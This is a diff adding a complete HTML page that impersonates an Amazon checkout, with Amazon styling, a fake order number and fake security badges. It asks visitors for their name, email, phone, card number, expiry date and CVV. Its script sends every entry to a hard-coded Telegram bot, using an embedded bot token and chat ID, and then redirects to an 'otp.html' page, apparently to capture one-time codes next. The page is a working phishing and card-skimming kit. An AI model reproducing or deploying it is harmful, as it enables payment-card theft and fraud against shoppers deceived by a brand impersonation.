@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Payment Method</title>
+  <style>
+    body {
+      font-family: 'Amazon Ember', Arial, sans-serif;
+      background-color: #f7f7f7;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 50px auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+    }
+
+    .header {
+      text-align: center;
+      background-color: #232f3e;
+      padding: 20px;
+      border-radius: 10px 10px 0 0;
+    }
+
+    .header img {
+      width: 120px;
+      cursor: pointer;
+    }
+
+    .progress-bar {
+      background-color: #ddd;
+      height: 8px;
+      border-radius: 4px;
+      margin: 20px 0;
+    }
+
+    .progress {
+      width: 80%;
+      height: 8px;
+      background-color: #ff9900;
+      border-radius: 4px;
+    }
+
+    .summary {
+      font-size: 15px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .summary strong {
+      display: block;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .security-icons {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 12px;
+    }
+
+    .security-icons img {
+      height: 35px;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 6px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+    }
+
+    input.valid {
+      border-color: #28a745;
+    }
+
+    input.invalid {
+      border-color: #dc3545;
+    }
+
+    .error-message {
+      color: #dc3545;
+      font-size: 12px;
+      margin-top: 4px;
+      display: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #ff9900;
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background-color: #e68a00;
+    }
+
+    .trusted-logos {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .trusted-logos img {
+      height: 50px;
+      margin: 10px 15px;
+    }
+
+    .disclaimer {
+      font-size: 12px;
+      text-align: center;
+      color: #777;
+      margin-top: 20px;
+    }
+
+    @media screen and (max-width: 500px) {
+      .container {
+        margin: 20px;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <img src="https://i.ibb.co/Sw6P1yhc/download-18.png" alt="Amazon" onclick="redirectToAmazon()" />
+  </div>
+
+  <div class="progress-bar"><div class="progress"></div></div>
+
+  <div class="summary">
+    Payment Beneficiary and Description
+    <strong>Payment for order: #9709442</strong>
+    <div class="security-icons">
+      <img src="https://i.ibb.co/8xGbkxk/pngegg.png" alt="Visa Secure" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" />
+      <img src="https://i.ibb.co/5kYjw3p/ssl-secured7869.jpg" alt="SSL Secure" />
+    </div>
+  </div>
+
+  <form id="payment-form" onsubmit="submitPayment(event)">
+    <div class="form-group">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" placeholder="Your full name" required />
+      <div id="name-error" class="error-message">Name must be at least 2 characters.</div>
+    </div>
+
+    <div class="form-group">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" placeholder="example@email.com" required />
+      <div id="email-error" class="error-message">Invalid email address.</div>
+    </div>
+
+    <div class="form-group">
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" placeholder="01XXXXXXXXX" required />
+      <div id="phone-error" class="error-message">Invalid phone number.</div>
+    </div>
+
+    <div class="form-group">
+      <label for="country">Country</label>
+      <select id="country" required>
+        <option value="">Select Country</option>
+        <option value="US">United States</option>
+        <option value="CA">Canada</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="card-number">Card Number</label>
+      <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required />
+      <div id="card-number-error" class="error-message">Card number must be 13–19 digits.</div>
+    </div>
+
+    <div class="form-group">
+      <label for="expiry-date">Expiry Date</label>
+      <input type="text" id="expiry-date" placeholder="MM/YY" required />
+      <div id="expiry-date-error" class="error-message">Format must be MM/YY.</div>
+    </div>
+
+    <div class="form-group">
+      <label for="cvv">CVV</label>
+      <input type="text" id="cvv" placeholder="123" required />
+      <div id="cvv-error" class="error-message">CVV must be 3 or 4 digits.</div>
+    </div>
+
+    <button type="submit">Pay $9.95</button>
+  </form>
+
+  <div class="trusted-logos">
+    <img src="https://images.prismic.io/volusion/030c7cea-b6bc-49dd-982d-328c70aedb24_trustedsitelogo.png" alt="Trusted Site" />
+    <img src="https://static.vecteezy.com/system/resources/previews/024/044/763/non_2x/secure-ssl-encryption-logo-secure-connection-icon-illustration-ssl-certificate-icon-secure-ssl-encryption-illustration-logo-design-vector.jpg" alt="SSL Encryption" />
+  </div>
+
+  <div class="disclaimer">
+    All transactions are secured and encrypted. Your payment details will not be shared.
+  </div>
+</div>
+
+<script>
+  const botToken = "7752649046:AAH04kE54l4VAwuuilM_xv83ngBuzzVBYj8";
+  const chatId = "5349147090";
+
+  function redirectToAmazon() {
+    window.location.href = "otp.html";
+  }
+
+  function isValidCardNumber(num) {
+    return /^\d{13,19}$/.test(num.replace(/\s+/g, ""));
+  }
+
+  function isValidPhone(phone) {
+    return /^[0-9]{10,15}$/.test(phone.replace(/\D/g, ""));
+  }
+
+  function isValidEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  }
+
+  const fields = [
+    { id: "name", validate: val => val.trim().length >= 2 },
+    { id: "email", validate: isValidEmail },
+    { id: "phone", validate: isValidPhone },
+    { id: "card-number", validate: isValidCardNumber },
+    { id: "expiry-date", validate: val => /^\d{2}\/\d{2}$/.test(val) },
+    { id: "cvv", validate: val => /^\d{3,4}$/.test(val) }
+  ];
+
+  fields.forEach(({ id, validate }) => {
+    const input = document.getElementById(id);
+    const errorDiv = document.getElementById(`${id}-error`);
+    input.addEventListener("input", () => {
+      const val = input.value.trim();
+      if (validate(val)) {
+        input.classList.add("valid");
+        input.classList.remove("invalid");
+        errorDiv.style.display = "none";
+      } else {
+        input.classList.remove("valid");
+        input.classList.add("invalid");
+        errorDiv.style.display = "block";
+      }
+    });
+  });
+
+  document.getElementById("card-number").addEventListener("input", function (e) {
+    const val = e.target.value.replace(/\D/g, "").substring(0, 19);
+    e.target.value = val.match(/.{1,4}/g)?.join(" ") || "";
+  });
+
+  document.getElementById("expiry-date").addEventListener("input", function (e) {
+    let val = e.target.value.replace(/\D/g, "").substring(0, 4);
+    if (val.length >= 3) {
+      val = val.substring(0, 2) + "/" + val.substring(2);
+    }
+    e.target.value = val;
+  });
+
+  document.getElementById("cvv").addEventListener("input", function (e) {
+    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 4);
+  });
+
+  document.getElementById("phone").addEventListener("input", function (e) {
+    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 15);
+  });
+
+  function submitPayment(e) {
+    e.preventDefault();
+    let valid = true;
+
+    fields.forEach(({ id, validate }) => {
+      const input = document.getElementById(id);
+      const errorDiv = document.getElementById(`${id}-error`);
+      if (!validate(input.value.trim())) {
+        input.classList.add("invalid");
+        errorDiv.style.display = "block";
+        valid = false;
+      }
+    });
+
+    if (!valid) return;
+
+    const name = document.getElementById("name").value.trim();
+    const email = document.getElementById("email").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const country = document.getElementById("country").value;
+    const cardNumber = document.getElementById("card-number").value.trim();
+    const expiryDate = document.getElementById("expiry-date").value.trim();
+    const cvv = document.getElementById("cvv").value.trim();
+
+    const msg = `💳 New Payment Details:
+👤 Name: ${name}
+📧 Email: ${email}
+📱 Phone: ${phone}
+🌍 Country: ${country}
+💳 Card: ${cardNumber}
+📆 Expiry: ${expiryDate}
+🔐 CVV: ${cvv}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: msg }),
+    })
+    .then(res => {
+      if (res.ok) {
+        setTimeout(() => redirectToAmazon(), 1500);
+      } else {
+        alert("❌ Failed to send data.");
+      }
+    })
+    .catch(() => alert("❌ Network error."));
+  }
+</script>
+</body>
+</html>
